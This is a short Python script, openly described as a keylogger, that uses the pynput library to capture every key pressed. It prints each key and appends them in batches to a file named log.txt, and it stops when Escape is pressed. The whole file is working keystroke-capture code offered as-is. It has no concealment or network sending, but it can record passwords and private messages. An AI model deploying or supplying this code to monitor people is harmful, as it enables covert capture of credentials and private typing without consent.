# A Simple Keylogger Program which logs every key you press on the keyboard in the file named log.txt
import pynput
from pynput.keyboard import Listener, Key

count = 0
keys = []


def press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0}".format(key))

    if count >= 10:
        count = 0
        log(keys)
        keys = []


def log(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("enter") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def release(key):
    if key == Key.esc:
        return False


with Listener(on_press=press, on_release=release) as listener:
    listener.join()
